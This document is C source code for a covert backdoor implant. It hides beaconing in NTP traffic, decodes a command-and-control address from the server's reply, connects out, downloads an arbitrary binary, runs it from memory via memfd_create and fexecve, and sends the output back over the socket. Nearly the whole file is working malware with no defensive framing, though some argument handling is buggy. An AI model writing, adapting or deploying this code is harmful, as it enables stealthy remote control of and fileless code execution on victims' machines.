//#define NTP_SERVER "XXX.XXX.XXX.XXX"
#define NTP_SERVER "127.0.0.1"
//#define NTP_PORT 12345
#define NTP_PORT 123
#define ID 54321

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

#define NTP_TIMESTAMP_DELTA 2208988800ull

int main() {
    int sock_fd;
    struct sockaddr_in servaddr;
    char buffer[48];
    time_t t;
    unsigned int delta;
    int a;

    sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr=inet_addr(NTP_SERVER);
    servaddr.sin_port=htons(NTP_PORT);

    while (1) {
        memset(buffer, 0, 48);
        buffer[0] = 0xe3;

        a = ID;
        delta = (unsigned int)time(NULL) + NTP_TIMESTAMP_DELTA;
        *(unsigned int *)(buffer + 40) = htonl(delta);
        *(unsigned int *)(buffer + 44) = a ^ delta;

        sendto(sock_fd, buffer, 48, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
        recvfrom(sock_fd, buffer, 48, 0, NULL, NULL);

        a = buffer[47] ^ buffer[46] ^ buffer[45] ^ buffer[44];

        if (a) {
            //if (fork()) {
            if (1) {
                char c2_ip[16];
                sprintf(c2_ip, "%u.%u.%u.%u", buffer[12], buffer[13], buffer[14], buffer[15]);

                printf("Spawning session handler to %s:%d\n", c2_ip, ntohl(*((int*)(buffer + 4))));

                sock_fd = socket(AF_INET, SOCK_STREAM, 0);
                socklen_t servaddr_len = sizeof(servaddr);
                servaddr.sin_family = AF_INET;
                servaddr.sin_port = htons(ntohl(*((int*)(buffer + 4))));
                servaddr.sin_addr.s_addr = inet_addr(c2_ip);
                connect(sock_fd, (struct sockaddr *) &servaddr, sizeof(servaddr));

                // Check in with ID
                a = ID;
                sendto(sock_fd, &a, 4, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));

                // Receive initial packet
                int header[2];
                recvfrom(sock_fd, header, 8, 0, (struct sockaddr *)&servaddr, &servaddr_len);

                // Allocate buffers
                char *args = malloc(header[0]);
                char *bin = malloc(header[1]);

                // Receive args
                recvfrom(sock_fd, args, header[0], 0, (struct sockaddr *)&servaddr, &servaddr_len);

                // Receive binary
                a = header[1];
                while (a > 1024) {
                    recvfrom(sock_fd, bin, 1024, 0, (struct sockaddr *)&servaddr, &servaddr_len);
                    a -= 1024;
                    bin += 1024;
                }
                recvfrom(sock_fd, bin, a, 0, (struct sockaddr *)&servaddr, &servaddr_len);
                bin -= (header[1] - a);

                // Execute binary
                a = memfd_create("0", 0);
                write(a, bin, header[1]);

                char** argv = malloc(sizeof(char*));
                int b = 0;
                char *p = strtok(args, " ");
                while (p != NULL) {
                    argv[b] = malloc(strlen(p) + 1);
                    strcpy(argv[b], p);
                    argv = realloc(argv, sizeof(char*) * (++b));
                    p = strtok (NULL, " ");
                }

                printf("Executing %s\n", argv[0]);
                for (int i =  0; i < b; i++) {
                    printf("argv[%d] = %s\n", i, argv[i]);
                }

                //if (fork()) {
                if (1) {
                    dup2(0, sock_fd);
                    dup2(sock_fd, 1);
                    dup2(sock_fd, 2);
                    fexecve(a, argv, argv);
                    perror("fexecve");
                    exit(0);
                }

                sleep(60);
            }
            continue;
        }

        sleep((2 << (unsigned char)buffer[2]));
    }

    return 0;
}